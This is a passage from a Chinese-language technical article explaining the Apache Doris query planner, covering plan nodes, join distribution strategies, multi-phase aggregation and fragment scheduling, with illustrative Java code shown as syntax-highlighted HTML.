    <span class="hljs-comment">// 统计信息</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">long</span> cardinality;       <span class="hljs-comment">// 输出行数估算</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">double</span> avgRowSize;      <span class="hljs-comment">// 平均行大小</span>
    
    <span class="hljs-comment">// 核心方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeStats</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">treeToThrift</span><span class="hljs-params">(TPlanNode container)</span>;
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li><strong>树形结构</strong>：每个 PlanNode 可以有多个 children</li>
<li><strong>谓词下推</strong>：conjuncts 存储可以在该节点执行的过滤条件</li>
<li><strong>统计信息</strong>：cardinality、avgRowSize 用于代价估算</li>
<li><strong>Runtime Filter</strong>：动态生成的过滤器，用于优化 Join 性能</li>
<li><strong>Tuple 模型</strong>：输出数据以 Tuple（元组）形式表示</li>
</ol>
<h3 data-id="heading-8">2.2 PlanNode 类型层次</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[PlanNode] --&gt; B[ScanNode]
    A --&gt; C[JoinNodeBase]
    A --&gt; D[AggregationNode]
    A --&gt; E[SortNode]
    A --&gt; F[UnionNode]
    A --&gt; G[ExchangeNode]
    A --&gt; H[SelectNode]
    
    B --&gt; B1[OlapScanNode]
    B --&gt; B2[SchemaScanNode]
    B --&gt; B3[FileScanNode]
    B --&gt; B4[JdbcScanNode]
    
    C --&gt; C1[HashJoinNode]
    C --&gt; C2[NestLoopJoinNode]
    C --&gt; C3[CrossJoinNode]
</code></pre>
<h3 data-id="heading-9">2.3 核心 PlanNode 详解</h3>
<h4 data-id="heading-10">2.3.1 OlapScanNode（OLAP 表扫描节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/OlapScanNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OlapScanNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScanNode</span> {
    <span class="hljs-keyword">private</span> OlapTable olapTable;
    
    <span class="hljs-comment">// 分区裁剪结果</span>
    <span class="hljs-keyword">private</span> Collection&lt;Long&gt; selectedPartitionIds;
    
    <span class="hljs-comment">// Tablet 分布信息</span>
    <span class="hljs-keyword">private</span> Map&lt;Long, Integer&gt; bucketSeq2locations;
    <span class="hljs-keyword">private</span> List&lt;Long&gt; scanTabletIds;
    
    <span class="hljs-comment">// 预聚合标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isPreAggregation</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">reasonOfPreAggregation</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-comment">// 索引选择</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> selectedIndexId;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException {
        <span class="hljs-built_in">super</span>.init(analyzer);
        
        <span class="hljs-comment">// 1. 分区裁剪</span>
        selectedPartitionIds = partitionPrune(analyzer);
        
        <span class="hljs-comment">// 2. 选择最优索引（Rollup 或物化视图）</span>
        selectedIndexId = selectBestRollupByRollupSelector(analyzer);
        
        <span class="hljs-comment">// 3. Tablet 裁剪和分配</span>
        computeTabletInfo();
        
        <span class="hljs-comment">// 4. 判断是否可以预聚合</span>
        canPreAggregation();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeTabletInfo</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 根据分区选择 Tablet</span>
        <span class="hljs-keyword">for</span> (Long partitionId : selectedPartitionIds) {
            <span class="hljs-type">Partition</span> <span class="hljs-variable">partition</span> <span class="hljs-operator">=</span> olapTable.getPartition(partitionId);
            <span class="hljs-type">MaterializedIndex</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> partition.getIndex(selectedIndexId);
            
            <span class="hljs-keyword">for</span> (Tablet tablet : index.getTablets()) {
                scanTabletIds.add(tablet.getId());
                
                <span class="hljs-comment">// 获取 Tablet 的副本位置</span>
                List&lt;Replica&gt; replicas = tablet.getReplicas();
                <span class="hljs-keyword">for</span> (Replica replica : replicas) {
                    <span class="hljs-type">Backend</span> <span class="hljs-variable">backend</span> <span class="hljs-operator">=</span> Catalog.getCurrentSystemInfo()
                        .getBackend(replica.getBackendId());
                    <span class="hljs-keyword">if</span> (backend.isAlive()) {
                        <span class="hljs-comment">// 记录 Backend 位置信息</span>
                    }
                }
            }
        }
    }
}
</code></pre>
<p><strong>关键功能</strong>：</p>
<ol>
<li>
<p><strong>分区裁剪（Partition Pruning）</strong>：</p>
<ul>
<li>根据 WHERE 条件过滤不需要扫描的分区</li>
<li>减少数据扫描量</li>
</ul>
</li>
<li>
<p><strong>索引选择（Rollup Selection）</strong>：</p>
<ul>
<li>根据查询列和过滤条件选择最优索引</li>
<li>优先选择列数少、数据量小的 Rollup</li>
</ul>
</li>
<li>
<p><strong>Tablet 分配</strong>：</p>
<ul>
<li>为每个 Tablet 选择可用的 Replica</li>
<li>考虑 Backend 负载均衡</li>
</ul>
</li>
<li>
<p><strong>预聚合优化</strong>：</p>
<ul>
<li>对于聚合模型，判断是否可以利用预聚合结果</li>
<li>避免重复计算</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11">2.3.2 HashJoinNode（哈希连接节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/HashJoinNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashJoinNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JoinNodeBase</span> {
    <span class="hljs-comment">// 等值连接条件：a = b 或 a &lt;=&gt; b</span>
    <span class="hljs-keyword">private</span> List&lt;BinaryPredicate&gt; eqJoinConjuncts = Lists.newArrayList();
    
    <span class="hljs-comment">// 非等值连接条件</span>
    <span class="hljs-keyword">private</span> List&lt;Expr&gt; otherJoinConjuncts;
    
    <span class="hljs-comment">// 分布式执行模式</span>
    <span class="hljs-keyword">private</span> DistributionMode distrMode;
    
    <span class="hljs-comment">// Colocate Join 标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isColocate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">colocateReason</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DistributionMode</span> {
        NONE,           <span class="hljs-comment">// 本地 Join（数据已在同一节点）</span>
        BROADCAST,      <span class="hljs-comment">// 广播小表</span>
        PARTITIONED,    <span class="hljs-comment">// 双边 Shuffle</span>
        BUCKET_SHUFFLE, <span class="hljs-comment">// 桶 Shuffle</span>
        COLOCATE        <span class="hljs-comment">// Colocate Join（数据已按相同规则分布）</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HashJoinNode</span><span class="hljs-params">(PlanNodeId id, PlanNode outer, PlanNode inner,
                        TableRefInfo innerRef, List&lt;Expr&gt; eqJoinConjuncts,
                        List&lt;Expr&gt; otherJoinConjuncts)</span> {
        <span class="hljs-built_in">super</span>(id, <span class="hljs-string">"HASH JOIN"</span>, StatisticalType.HASH_JOIN_NODE, 
              outer, inner, innerRef);
        
        <span class="hljs-comment">// 处理等值连接条件</span>
        <span class="hljs-keyword">for</span> (Expr eqJoinPredicate : eqJoinConjuncts) {
            <span class="hljs-type">BinaryPredicate</span> <span class="hljs-variable">eqJoin</span> <span class="hljs-operator">=</span> (BinaryPredicate) eqJoinPredicate;
            
            <span class="hljs-comment">// EQ_FOR_NULL (&lt;=&gt; 操作符) 可能转换为 EQ</span>
            <span class="hljs-keyword">if</span> (eqJoin.getOp().equals(BinaryPredicate.Operator.EQ_FOR_NULL)) {
                <span class="hljs-keyword">if</span> (!eqJoin.getChild(<span class="hljs-number">0</span>).isNullable() || 
                    !eqJoin.getChild(<span class="hljs-number">1</span>).isNullable()) {
                    eqJoin.setOp(BinaryPredicate.Operator.EQ);
                }
            }
            <span class="hljs-built_in">this</span>.eqJoinConjuncts.add(eqJoin);
        }
        
        <span class="hljs-built_in">this</span>.otherJoinConjuncts = otherJoinConjuncts;
        <span class="hljs-built_in">this</span>.distrMode = DistributionMode.NONE;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span> {
        msg.node_type = TPlanNodeType.HASH_JOIN_NODE;
        msg.hash_join_node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">THashJoinNode</span>();
        msg.hash_join_node.join_op = joinOp.toThrift();
        
        <span class="hljs-comment">// 标识是否为广播 Join</span>
        msg.hash_join_node.setIsBroadcastJoin(
            distrMode == DistributionMode.BROADCAST);
        
        <span class="hljs-comment">// 序列化等值连接条件</span>
        <span class="hljs-keyword">for</span> (BinaryPredicate eqJoinPredicate : eqJoinConjuncts) {
            <span class="hljs-type">TEqJoinCondition</span> <span class="hljs-variable">eqJoinCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TEqJoinCondition</span>(
                eqJoinPredicate.getChild(<span class="hljs-number">0</span>).treeToThrift(),
                eqJoinPredicate.getChild(<span class="hljs-number">1</span>).treeToThrift()
            );
            eqJoinCondition.setOpcode(eqJoinPredicate.getOp().getOpcode());
            msg.hash_join_node.addToEqJoinConjuncts(eqJoinCondition);
        }
        
        <span class="hljs-comment">// 序列化非等值连接条件</span>
        <span class="hljs-keyword">for</span> (Expr e : otherJoinConjuncts) {
            msg.hash_join_node.addToOtherJoinConjuncts(e.treeToThrift());
        }
    }
}
</code></pre>
<p><strong>Join 分布式策略选择</strong>：</p>
<ol>
<li>
<p><strong>BROADCAST（广播）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：右表很小（通常 &lt; 100MB）</li>
<li><strong>执行方式</strong>：将右表广播到所有执行左表扫描的节点</li>
<li><strong>优点</strong>：避免大表 Shuffle，网络传输小</li>
<li><strong>缺点</strong>：每个节点都要存储右表完整数据</li>
</ul>
</li>
<li>
<p><strong>PARTITIONED（分区/Shuffle）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：两表都很大</li>
<li><strong>执行方式</strong>：按 Join Key 对两表进行 Hash 分区</li>
<li><strong>优点</strong>：内存占用小，适合大表 Join</li>
<li><strong>缺点</strong>：需要 Shuffle 两表数据，网络开销大</li>
</ul>
</li>
<li>
<p><strong>COLOCATE（数据本地化）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：两表按相同分桶键分布</li>
<li><strong>执行方式</strong>：数据已在相同节点，本地 Join</li>
<li><strong>优点</strong>：无需数据移动，性能最优</li>
<li><strong>缺点</strong>：表创建时需要规划 Colocate Group</li>
</ul>
</li>
<li>
<p><strong>BUCKET_SHUFFLE（桶 Shuffle）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：一侧表已按 Join Key 分桶</li>
<li><strong>执行方式</strong>：只 Shuffle 另一侧表</li>
<li><strong>优点</strong>：减少一半的 Shuffle 数据量</li>
<li><strong>缺点</strong>：需要分桶表参与</li>
</ul>
</li>
</ol>
<h4 data-id="heading-12">2.3.3 AggregationNode（聚合节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/AggregationNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AggregationNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AggregateInfo aggInfo;
    
    <span class="hljs-comment">// 是否需要 Finalize 阶段（分布式聚合的最后一步）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> needsFinalize;
    
    <span class="hljs-comment">// 是否使用流式预聚合</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> useStreamingPreagg;
    
    <span class="hljs-comment">// Colocate 聚合标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isColocate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// 按 Group Key 排序的信息</span>
    <span class="hljs-keyword">private</span> SortInfo sortByGroupKey;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AggregationNode</span><span class="hljs-params">(PlanNodeId id, PlanNode input, 
                          AggregateInfo aggInfo)</span> {
        <span class="hljs-built_in">super</span>(id, aggInfo.getOutputTupleId().asList(), 
              <span class="hljs-string">"AGGREGATE"</span>, StatisticalType.AGG_NODE);
        <span class="hljs-built_in">this</span>.aggInfo = aggInfo;
        <span class="hljs-built_in">this</span>.children.add(input);
        <span class="hljs-built_in">this</span>.needsFinalize = <span class="hljs-literal">true</span>;
        updateplanNodeName();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateplanNodeName</span><span class="hljs-params">()</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        sb.append(<span class="hljs-string">"VAGGREGATE"</span>);
        sb.append(<span class="hljs-string">" ("</span>);
        
        <span class="hljs-keyword">if</span> (aggInfo.isMerge()) {
            sb.append(<span class="hljs-string">"merge"</span>);      <span class="hljs-comment">// 合并中间结果</span>
        } <span class="hljs-keyword">else</span> {
            sb.append(<span class="hljs-string">"update"</span>);     <span class="hljs-comment">// 更新聚合状态</span>
        }
        
        <span class="hljs-keyword">if</span> (needsFinalize) {
            sb.append(<span class="hljs-string">" finalize"</span>);  <span class="hljs-comment">// 输出最终结果</span>
        } <span class="hljs-keyword">else</span> {
            sb.append(<span class="hljs-string">" serialize"</span>); <span class="hljs-comment">// 序列化中间状态</span>
        }
        sb.append(<span class="hljs-string">")"</span>);
        setPlanNodeName(sb.toString());
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span> {
        msg.node_type = TPlanNodeType.AGGREGATION_NODE;
        
        <span class="hljs-comment">// 序列化聚合函数</span>
        List&lt;TExpr&gt; aggregateFunctions = Lists.newArrayList();
        <span class="hljs-keyword">for</span> (FunctionCallExpr e : aggInfo.getMaterializedAggregateExprs()) {
            aggregateFunctions.add(e.treeToThrift());
        }
        
        msg.agg_node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAggregationNode</span>(
            aggregateFunctions,
            aggInfo.getOutputTupleId().asInt(),
            aggInfo.getOutputTupleId().asInt(), 
            needsFinalize
        );
        
        msg.agg_node.setUseStreamingPreaggregation(useStreamingPreagg);
        msg.agg_node.setIsColocate(isColocate);
        
        <span class="hljs-comment">// 序列化分组表达式</span>
        List&lt;Expr&gt; groupingExprs = aggInfo.getGroupingExprs();
        <span class="hljs-keyword">if</span> (groupingExprs != <span class="hljs-literal">null</span>) {
            msg.agg_node.setGroupingExprs(Expr.treesToThrift(groupingExprs));
        }
    }
}
</code></pre>
<p><strong>聚合分阶段执行</strong>：</p>
<ol>
<li>
<p><strong>单阶段聚合</strong>（Single-Phase Aggregation）：</p>
<ul>
<li>适用场景：数据量小或无 GROUP BY</li>
<li>执行方式：单节点完成所有聚合</li>
<li>示例：<code>SELECT COUNT(*) FROM table</code></li>
</ul>
</li>
<li>
<p><strong>两阶段聚合</strong>（Two-Phase Aggregation）：</p>
<ul>
<li>适用场景：分布式大数据集聚合</li>
<li><strong>第一阶段（Update/Serialize）</strong>：
<ul>
<li>在各个 BE 节点本地聚合（预聚合）</li>
<li>输出中间聚合状态（序列化）</li>
</ul>
</li>
<li><strong>第二阶段（Merge/Finalize）</strong>：
<ul>
<li>按 Group Key Shuffle 数据</li>
<li>合并中间状态并输出最终结果</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>三阶段聚合</strong>（Three-Phase Aggregation）：</p>
<ul>
<li>适用场景：高基数 GROUP BY + 大数据量</li>
<li><strong>第一阶段</strong>：本地预聚合</li>
<li><strong>第二阶段</strong>：中间合并（减少数据量）</li>
<li><strong>第三阶段</strong>：最终聚合</li>
</ul>
</li>
</ol>
<p><strong>流式预聚合（Streaming Preagg）</strong>：</p>
<ul>
<li><strong>启用条件</strong>：
<ul>
<li>GROUP BY 列基数适中（不是太高）</li>
<li>输入数据有一定局部性（相同 Key 相邻）</li>
</ul>
</li>
<li><strong>优点</strong>：
<ul>
<li>边读边聚合，减少内存占用</li>
<li>提前过滤数据，减少网络传输</li>
</ul>
</li>
<li><strong>禁用场景</strong>：
<ul>
<li>GROUP BY 列基数极高（预聚合效果差）</li>
<li>聚合函数不支持流式（如 PERCENTILE）</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-13">3. PlanFragment 片段化执行（What &amp; Why）</h2>
<h3 data-id="heading-14">3.1 为什么需要 Fragment</h3>
<p><strong>问题</strong>：一个复杂查询如何在分布式环境中执行？</p>
<p><strong>解决方案</strong>：将查询计划分解为多个 <strong>PlanFragment</strong>（片段），每个 Fragment 可以在不同节点并行执行。</p>
<p><strong>示例查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> t1.id, <span class="hljs-built_in">SUM</span>(t2.amount)
<span class="hljs-keyword">FROM</span> table1 t1
<span class="hljs-keyword">JOIN</span> table2 t2 <span class="hljs-keyword">ON</span> t1.id <span class="hljs-operator">=</span> t2.id
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.id;
</code></pre>
<p><strong>Fragment 分解</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">Fragment <span class="hljs-number">2</span> (Final Aggregation &amp; Output)
    └── VAGGREGATE (merge finalize)
        └── EXCHANGE (接收 Fragment <span class="hljs-number">1</span> 的数据)

Fragment <span class="hljs-number">1</span> (Join &amp; Pre-Aggregation)
    └── VAGGREGATE (update serialize)
        └── HASH JOIN
            ├── OLAP_SCAN (table1) - 左表
            └── EXCHANGE (接收 Fragment <span class="hljs-number">0</span> 的数据) - 右表

Fragment <span class="hljs-number">0</span> (Right Table Scan)
    └── OLAP_SCAN (table2)
</code></pre>
<h3 data-id="heading-15">3.2 PlanFragment 核心设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/PlanFragment.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanFragment</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PlanFragmentId fragmentId;
    <span class="hljs-keyword">private</span> PlanNode planRoot;              <span class="hljs-comment">// Fragment 的根节点</span>
    <span class="hljs-keyword">private</span> DataPartition dataPartition;    <span class="hljs-comment">// 数据分区方式</span>
    <span class="hljs-keyword">private</span> DataPartition outputPartition;  <span class="hljs-comment">// 输出分区方式</span>
    
    <span class="hljs-comment">// Fragment 的数据接收者</span>
    <span class="hljs-keyword">private</span> DataSink sink;
    
    <span class="hljs-comment">// Fragment 的并行度（实例数）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> numInstances;
    
    <span class="hljs-comment">// Runtime Filter 信息</span>
    <span class="hljs-keyword">private</span> List&lt;RuntimeFilter&gt; targetRuntimeFilters;
    <span class="hljs-keyword">private</span> List&lt;RuntimeFilter&gt; builderRuntimeFilters;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PlanFragment</span><span class="hljs-params">(PlanFragmentId id, PlanNode root, 
                       DataPartition partition)</span> {
        <span class="hljs-built_in">this</span>.fragmentId = id;
        <span class="hljs-built_in">this</span>.planRoot = root;
        <span class="hljs-built_in">this</span>.dataPartition = partition;
        setFragmentInPlanTree(planRoot);
    }
    
    <span class="hljs-comment">// 递归设置所有 PlanNode 的 Fragment ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFragmentInPlanTree</span><span class="hljs-params">(PlanNode node)</span> {
        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        node.setFragmentId(<span class="hljs-built_in">this</span>.fragmentId);
        <span class="hljs-keyword">for</span> (PlanNode child : node.getChildren()) {
            <span class="hljs-keyword">if</span> (child <span class="hljs-keyword">instanceof</span> ExchangeNode) <span class="hljs-keyword">continue</span>;
            setFragmentInPlanTree(child);
        }
    }
}
</code></pre>
<p><strong>Fragment 关键属性</strong>：</p>
<ol>
<li>
<p><strong>planRoot</strong>：Fragment 的执行计划树根节点</p>
</li>
<li>
<p><strong>dataPartition</strong>：数据分区方式（决定如何并行执行）</p>
<ul>
<li><code>UNPARTITIONED</code>：单节点执行</li>
<li><code>RANDOM</code>：随机分区（Round-Robin）</li>
<li><code>HASH_PARTITIONED</code>：按 Hash 分区</li>
<li><code>RANGE_PARTITIONED</code>：按范围分区</li>
</ul>
</li>
<li>
<p><strong>sink</strong>：数据输出目标</p>
<ul>
<li><code>DataStreamSink</code>：发送给其他 Fragment（ExchangeNode）</li>
<li><code>ResultSink</code>：返回给客户端</li>
<li><code>OlapTableSink</code>：写入 OLAP 表（INSERT）</li>
</ul>
</li>
<li>
<p><strong>numInstances</strong>：Fragment 的并行实例数</p>
<ul>
<li>由数据分区和节点数量决定</li>
<li>每个实例处理一部分数据</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">3.3 ExchangeNode（数据交换节点）</h3>
<p><strong>作用</strong>：连接不同 Fragment，接收其他 Fragment 的输出数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExchangeNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">private</span> PlanFragmentId inputFragmentId;  <span class="hljs-comment">// 数据来源 Fragment</span>
    
    <span class="hljs-comment">// Exchange 类型</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ExchangeType</span> {
        MERGING,      <span class="hljs-comment">// 归并排序（保持有序）</span>
        HASH,         <span class="hljs-comment">// Hash 分区</span>
        BROADCAST,    <span class="hljs-comment">// 广播</span>
        PASSTHROUGH   <span class="hljs-comment">// 透传（不重新分区）</span>
    }
}
</code></pre>
<p><strong>Fragment 连接示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">Fragment 1: <span class="hljs-section">[OLAP_SCAN]</span> --DataStreamSink--&gt; 
Fragment 2: <span class="hljs-section">[ExchangeNode]</span> --&gt; <span class="hljs-section">[HASH_JOIN]</span>
</code></pre>
<hr/>
<h2 data-id="heading-17">4. 分布式计划生成（How）</h2>
<h3 data-id="heading-18">4.1 分布式计划生成流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[单节点逻辑计划] --&gt; B[createPlanFragments]
    B --&gt; C[识别Fragment边界]
    C --&gt; D[为每个Fragment分配并行度]
    D --&gt; E[计算Fragment执行位置]
    E --&gt; F[生成FragmentExecParams]
    F --&gt; G[分配ScanRange到BE]
    G --&gt; H[PlanFragment列表]
</code></pre>
<h3 data-id="heading-19">4.2 Coordinator 的 Fragment 调度</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/qe/Coordinator.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Coordinator</span> {
    <span class="hljs-keyword">private</span> List&lt;PlanFragment&gt; fragments;
    <span class="hljs-keyword">private</span> List&lt;ScanNode&gt; scanNodes;
    
    <span class="hljs-comment">// Fragment 实例信息</span>
    <span class="hljs-keyword">private</span> Map&lt;PlanFragmentId, FragmentExecParams&gt; fragmentExecParamsMap;
    
    <span class="hljs-comment">// Backend 执行实例</span>
    <span class="hljs-keyword">private</span> Map&lt;TNetworkAddress, BackendExecState&gt; backendExecStates;
    
    <span class="hljs-comment">/**
     * 计算 Fragment 的执行位置和并行度
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeFragmentExecParams</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">for</span> (PlanFragment fragment : fragments) {
            <span class="hljs-type">FragmentExecParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FragmentExecParams</span>(fragment);
            
            <span class="hljs-comment">// 1. 识别 Fragment 类型</span>
            <span class="hljs-keyword">if</span> (containsScanNode(fragment)) {
                <span class="hljs-comment">// 包含 ScanNode 的 Fragment</span>
                computeScanRangeAssignment(fragment, params);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 不包含 ScanNode 的 Fragment（如聚合、Join 右表）</span>
                computeInstancesForNonScanFragment(fragment, params);
            }
            
            fragmentExecParamsMap.put(fragment.getFragmentId(), params);
        }
    }
    
    <span class="hljs-comment">/**
     * 为包含 ScanNode 的 Fragment 分配 Tablet
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeScanRangeAssignment</span><span class="hljs-params">(
            PlanFragment fragment, FragmentExecParams params)</span> {
        
        <span class="hljs-keyword">for</span> (ScanNode scanNode : fragment.getScanNodes()) {
            <span class="hljs-keyword">if</span> (scanNode <span class="hljs-keyword">instanceof</span> OlapScanNode) {
                <span class="hljs-type">OlapScanNode</span> <span class="hljs-variable">olapScan</span> <span class="hljs-operator">=</span> (OlapScanNode) scanNode;
                
                <span class="hljs-comment">// 获取需要扫描的所有 Tablet</span>
                List&lt;Long&gt; tabletIds = olapScan.getScanTabletIds();
                
                <span class="hljs-keyword">for</span> (Long tabletId : tabletIds) {
                    <span class="hljs-comment">// 获取 Tablet 的副本位置</span>
                    List&lt;Replica&gt; replicas = getTabletReplicas(tabletId);
                    
                    <span class="hljs-comment">// 选择最优副本（考虑负载均衡）</span>
                    <span class="hljs-type">Replica</span> <span class="hljs-variable">selectedReplica</span> <span class="hljs-operator">=</span> selectBestReplica(replicas);
                    <span class="hljs-type">Backend</span> <span class="hljs-variable">backend</span> <span class="hljs-operator">=</span> getBackend(
                        selectedReplica.getBackendId());
                    
                    <span class="hljs-comment">// 分配 ScanRange 到 Backend</span>
                    params.addScanRange(backend, tabletId, scanNode);
                }
            }
        }
    }
    
    <span class="hljs-comment">/**
     * 为不包含 ScanNode 的 Fragment 计算实例数
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeInstancesForNonScanFragment</span><span class="hljs-params">(
            PlanFragment fragment, FragmentExecParams params)</span> {
        
        <span class="hljs-comment">// 根据输入 Fragment 的并行度决定</span>
        <span class="hljs-type">PlanNode</span> <span class="hljs-variable">planRoot</span> <span class="hljs-operator">=</span> fragment.getPlanRoot();
        <span class="hljs-keyword">if</span> (planRoot <span class="hljs-keyword">instanceof</span> ExchangeNode) {
            <span class="hljs-type">ExchangeNode</span> <span class="hljs-variable">exchangeNode</span> <span class="hljs-operator">=</span> (ExchangeNode) planRoot;
            <span class="hljs-type">PlanFragmentId</span> <span class="hljs-variable">inputFragmentId</span> <span class="hljs-operator">=</span> 
                exchangeNode.getInputFragmentId();
            
            <span class="hljs-type">FragmentExecParams</span> <span class="hljs-variable">inputParams</span> <span class="hljs-operator">=</span> 
                fragmentExecParamsMap.get(inputFragmentId);
            
            <span class="hljs-keyword">if</span> (fragment.getDataPartition().isPartitioned()) {
                <span class="hljs-comment">// 需要 Shuffle：每个接收节点创建实例</span>
                params.setInstanceNum(inputParams.getInstanceNum());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 不需要 Shuffle：单实例汇总</span>
                params.setInstanceNum(<span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-20">4.3 FragmentExecParams（Fragment 执行参数）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FragmentExecParams</span> {
    <span class="hljs-keyword">public</span> PlanFragment fragment;
    
    <span class="hljs-comment">// Fragment 的所有执行实例</span>
    <span class="hljs-keyword">public</span> List&lt;FInstanceExecParam&gt; instanceExecParams;
    
    <span class="hljs-comment">/**
